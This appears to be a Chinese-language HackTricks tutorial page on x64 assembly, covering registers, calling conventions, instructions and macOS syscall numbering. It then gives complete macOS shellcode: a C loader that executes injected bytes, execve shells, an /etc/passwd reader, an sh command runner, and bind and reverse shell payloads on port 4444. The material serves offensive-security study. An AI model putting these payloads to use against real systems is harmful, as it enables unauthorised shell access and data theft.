# x64 简介

{{#include ../../../banners/hacktricks-training.md}}

## **x64 简介**

x64，也称为 x86-64，是一种 64 位处理器架构，主要用于桌面和服务器计算。它源自 Intel 生产的 x86 架构，后来被 AMD 采用并命名为 AMD64，如今已成为个人计算机和服务器中最常见的架构。

### **寄存器**

x64 在 x86 架构的基础上进行了扩展，包含 **16 个通用寄存器**，分别为 `rax`、`rbx`、`rcx`、`rdx`、`rbp`、`rsp`、`rsi`、`rdi` 以及 `r8` 到 `r15`。每个寄存器都可以存储一个 **64 位**（8 字节）的值。这些寄存器还具有 32 位、16 位和 8 位子寄存器，用于兼容性和特定任务。

1. **`rax`** - 通常用于存储函数的 **返回值**。
2. **`rbx`** - 经常作为内存操作的 **基址寄存器**。
3. **`rcx`** - 通常用于存储 **循环计数器**。
4. **`rdx`** - 用于多种用途，包括扩展算术运算。
5. **`rbp`** - 栈帧的 **基址指针**。
6. **`rsp`** - **栈指针**，用于跟踪栈顶位置。
7. **`rsi`** 和 **`rdi`** - 用于字符串/内存操作中的 **源**索引和 **目标**索引。
8. **`r8`** 到 **`r15`** - x64 引入的额外通用寄存器。

### **调用约定**

x64 调用约定因操作系统而异。例如：

- **Windows**：前 **四个参数**通过 **`rcx`**、**`rdx`**、**`r8`** 和 **`r9`** 寄存器传递。其余参数会被压入栈中。返回值存放在 **`rax`** 中。
- **System V（通常用于类 UNIX 系统）**：前 **六个整数或指针参数**通过 **`rdi`**、**`rsi`**、**`rdx`**、**`rcx`**、**`r8`** 和 **`r9`** 寄存器传递。返回值同样存放在 **`rax`** 中。

如果函数的输入参数超过六个，**其余参数将通过栈传递**。作为栈指针的 **RSP** 必须按 **16 字节对齐**，这意味着在执行任何调用之前，它所指向的地址必须能被 16 整除。也就是说，通常我们需要确保在进行函数调用前，shellcode 中的 RSP 已正确对齐。不过在实践中，即使不满足此要求，系统调用通常也能正常工作。

### Swift 中的调用约定

Swift 有自己的 **调用约定**，可以在 [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#x86-64) 中找到。

### **常见指令**

x64 指令集非常丰富，在保持与早期 x86 指令兼容的同时，也引入了许多新指令。

- **`mov`**：将一个值从一个 **寄存器**或**内存位置**移动到另一个位置。
- 示例：`mov rax, rbx` — 将 `rbx` 中的值移动到 `rax`。
- **`push`** 和 **`pop`**：向**栈**中压入值，或从栈中弹出值。
- 示例：`push rax` — 将 `rax` 中的值压入栈中。
- 示例：`pop rax` — 将栈顶的值弹出并放入 `rax`。
- **`add`** 和 **`sub`**：执行**加法**和**减法**操作。
- 示例：`add rax, rcx` — 将 `rax` 和 `rcx` 中的值相加，并将结果存入 `rax`。
- **`mul`** 和 **`div`**：执行**乘法**和**除法**操作。注意：它们在操作数使用方面具有特定行为。
- **`call`** 和 **`ret`**：用于**调用函数**以及**从函数返回**。
- **`int`**：用于触发软件**中断**。例如，`int 0x80` 曾用于 32 位 x86 Linux 中的系统调用。
- **`cmp`**：**比较**两个值，并根据结果设置 CPU 的标志位。
- 示例：`cmp rax, rdx` — 比较 `rax` 和 `rdx`。
- **`je`**、**`jne`**、**`jl`**、**`jge`** 等：根据之前的 `cmp` 或 test 结果改变控制流的**条件跳转**指令。
- 示例：在执行 `cmp rax, rdx` 指令后，`je label` — 如果 `rax` 等于 `rdx`，则跳转到 `label`。
- **`syscall`**：在某些 x64 系统（如现代 Unix）中用于执行**系统调用**。
- **`sysenter`**：某些平台上的优化**系统调用**指令。

### **函数序言**

1. **压入旧基址指针**：`push rbp`（保存调用者的基址指针）
2. **将当前栈指针移动到基址指针**：`mov rbp, rsp`（为当前函数设置新的基址指针）
3. **在栈上为局部变量分配空间**：`sub rsp, <size>`（其中 `<size>` 是所需的字节数）

### **函数尾声**

1. **将当前基址指针移动到栈指针**：`mov rsp, rbp`（释放局部变量所占空间）
2. **从栈中弹出旧基址指针**：`pop rbp`（恢复调用者的基址指针）
3. **返回**：`ret`（将控制权返回给调用者）

## macOS

### syscalls

syscalls 分为不同的类别，你可以[**在这里找到它们**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/osfmk/mach/i386/syscall_sw.h)**：**
```c
#define SYSCALL_CLASS_NONE	0	/* Invalid */
#define SYSCALL_CLASS_MACH	1	/* Mach */
#define SYSCALL_CLASS_UNIX	2	/* Unix/BSD */
#define SYSCALL_CLASS_MDEP	3	/* Machine-dependent */
#define SYSCALL_CLASS_DIAG	4	/* Diagnostics */
#define SYSCALL_CLASS_IPC	5	/* Mach IPC */
```
然后，你可以在[**此 URL 中**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)**找到每个 syscall 编号：**
```c
0	AUE_NULL	ALL	{ int nosys(void); }   { indirect syscall }
1	AUE_EXIT	ALL	{ void exit(int rval); }
2	AUE_FORK	ALL	{ int fork(void); }
3	AUE_NULL	ALL	{ user_ssize_t read(int fd, user_addr_t cbuf, user_size_t nbyte); }
4	AUE_NULL	ALL	{ user_ssize_t write(int fd, user_addr_t cbuf, user_size_t nbyte); }
5	AUE_OPEN_RWTC	ALL	{ int open(user_addr_t path, int flags, int mode); }
6	AUE_CLOSE	ALL	{ int close(int fd); }
7	AUE_WAIT4	ALL	{ int wait4(int pid, user_addr_t status, int options, user_addr_t rusage); }
8	AUE_NULL	ALL	{ int nosys(void); }   { old creat }
9	AUE_LINK	ALL	{ int link(user_addr_t path, user_addr_t link); }
10	AUE_UNLINK	ALL	{ int unlink(user_addr_t path); }
11	AUE_NULL	ALL	{ int nosys(void); }   { old execv }
12	AUE_CHDIR	ALL	{ int chdir(user_addr_t path); }
[...]
```
因此，要从 **Unix/BSD class** 调用 `open` syscall（**5**），需要将其加上：`0x2000000`

所以，调用 open 的 syscall number 将是 `0x2000005`

### Shellcodes

编译方法：
```bash
nasm -f macho64 shell.asm -o shell.o
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
```
提取字节：
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "shell.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done

# Another option
otool -t shell.o | grep 00 | cut -f2 -d$'\t' | sed 's/ /\\x/g' | sed 's/^/\\x/g' | sed 's/\\x$//g'
```
<details>

<summary>用于测试 shellcode 的 C 代码</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

取自[**此处**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)，并进行了讲解。<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
bits 64
global _main
_main:
call    r_cmd64
db '/bin/zsh', 0
r_cmd64:                      ; the call placed a pointer to db (argv[2])
pop     rdi               ; arg1 from the stack placed by the call to l_cmd64
xor     rdx, rdx          ; store null arg3
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
bits 64
global _main

_main:
xor     rdx, rdx          ; zero our RDX
push    rdx               ; push NULL string terminator
mov     rbx, '/bin/zsh'   ; move the path into RBX
push    rbx               ; push the path, to the stack
mov     rdi, rsp          ; store the stack pointer in RDI (arg1)
push    59                ; put 59 on the stack (execve syscall)
pop     rax               ; pop it to RAX
bts     rax, 25           ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall
```
{{#endtab}}
{{#endtabs}}

#### 使用 cat 读取

目标是执行 `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`，因此第二个参数（x1）是一个参数数组（在内存中，这意味着一个地址栈）。
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 40         ; Allocate space on the stack similar to `sub sp, sp, #48`

lea rdi, [rel cat_path]   ; rdi will hold the address of "/bin/cat"
lea rsi, [rel passwd_path] ; rsi will hold the address of "/etc/passwd"

; Create inside the stack the array of args: ["/bin/cat", "/etc/passwd"]
push rsi   ; Add "/etc/passwd" to the stack (arg0)
push rdi   ; Add "/bin/cat" to the stack (arg1)

; Set in the 2nd argument of exec the addr of the array
mov rsi, rsp    ; argv=rsp - store RSP's value in RSI

xor rdx, rdx    ; Clear rdx to hold NULL (no environment variables)

push    59      ; put 59 on the stack (execve syscall)
pop     rax     ; pop it to RAX
bts     rax, 25 ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall         ; Make the syscall

section .data
cat_path:      db "/bin/cat", 0
passwd_path:   db "/etc/passwd", 0
```
#### 使用 sh 调用命令
```armasm
bits 64
section .text
global _main

_main:
; Prepare the arguments for the execve syscall
sub rsp, 32           ; Create space on the stack

; Argument array
lea rdi, [rel touch_command]
push rdi                      ; push &"touch /tmp/lalala"
lea rdi, [rel sh_c_option]
push rdi                      ; push &"-c"
lea rdi, [rel sh_path]
push rdi                      ; push &"/bin/sh"

; execve syscall
mov rsi, rsp                  ; rsi = pointer to argument array
xor rdx, rdx                  ; rdx = NULL (no env variables)
push    59                    ; put 59 on the stack (execve syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

_exit:
xor rdi, rdi                  ; Exit status code 0
push    1                     ; put 1 on the stack (exit syscall)
pop     rax                   ; pop it to RAX
bts     rax, 25               ; set the 25th bit to 1 (to add 0x2000000 without using null bytes)
syscall

section .data
sh_path:        db "/bin/sh", 0
sh_c_option:    db "-c", 0
touch_command:  db "touch /tmp/lalala", 0
```
#### Bind shell

来自 [https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html) 的 Bind shell，使用 **port 4444**<sup>[[2]](#references)</sup>。
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xffffffffa3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; bind(host_sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x68
syscall

; listen(host_sockid, 2)
xor  rsi, rsi
mov  sil, 0x2
mov  rax, r8
mov  al, 0x6a
syscall

; accept(host_sockid, 0, 0)
xor  rsi, rsi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x1e
syscall

mov rdi, rax
mov sil, 0x3

dup2:
; dup2(client_sockid, 2)
;   -> dup2(client_sockid, 1)
;   -> dup2(client_sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
mov  rax, r8
mov  al, 0x3b
syscall
```
#### Reverse Shell

来自 [https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html) 的 Reverse shell。Reverse shell 连接到 **127.0.0.1:4444**<sup>[[3]](#references)</sup>。
```armasm
section .text
global _main
_main:
; socket(AF_INET4, SOCK_STREAM, IPPROTO_IP)
xor  rdi, rdi
mul  rdi
mov  dil, 0x2
xor  rsi, rsi
mov  sil, 0x1
mov  al, 0x2
ror  rax, 0x28
mov  r8, rax
mov  al, 0x61
syscall

; struct sockaddr_in {
;         __uint8_t       sin_len;
;         sa_family_t     sin_family;
;         in_port_t       sin_port;
;         struct  in_addr sin_addr;
;         char            sin_zero[8];
; };
mov  rsi, 0xfeffff80a3eefdf0
neg  rsi
push rsi
push rsp
pop  rsi

; connect(sockid, &sockaddr, 16)
mov  rdi, rax
xor  dl, 0x10
mov  rax, r8
mov  al, 0x62
syscall

xor rsi, rsi
mov sil, 0x3

dup2:
; dup2(sockid, 2)
;   -> dup2(sockid, 1)
;   -> dup2(sockid, 0)
mov  rax, r8
mov  al, 0x5a
sub  sil, 1
syscall
test rsi, rsi
jne  dup2

; execve("//bin/sh", 0, 0)
push rsi
mov  rdi, 0x68732f6e69622f2f
push rdi
push rsp
pop  rdi
xor  rdx, rdx
mov  rax, r8
mov  al, 0x3b
syscall
```
## 参考资料

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [Packet Storm - macOS TCP 4444 Bind Shell (Null-Free) Shellcode](https://packetstormsecurity.com/files/151731/macOS-TCP-4444-Bind-Shell-Null-Free-Shellcode.html)
- [3] [Packet Storm - macOS 127.0.0.1:4444 Reverse Shell Shellcode](https://packetstormsecurity.com/files/151727/macOS-127.0.0.1-4444-Reverse-Shell-Shellcode.html)

{{#include ../../../banners/hacktricks-training.md}}
